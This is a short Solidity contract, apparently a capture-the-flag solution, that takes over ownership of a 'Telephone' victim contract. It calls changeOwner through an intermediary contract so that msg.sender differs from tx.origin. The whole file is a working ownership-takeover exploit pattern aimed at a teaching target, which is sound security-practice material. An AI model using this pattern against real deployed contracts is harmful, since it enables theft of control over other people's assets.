// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TelephoneAttack2.sol";

contract TelephoneAttack {

  TelephoneAttack2 public telephoneAttack2;

  constructor(address _victimAttackContract) {
    telephoneAttack2 = TelephoneAttack2(_victimAttackContract);
  }

  function callSecondAttacker(address _owner) public {
    telephoneAttack2.changeOwner(_owner);
  }
}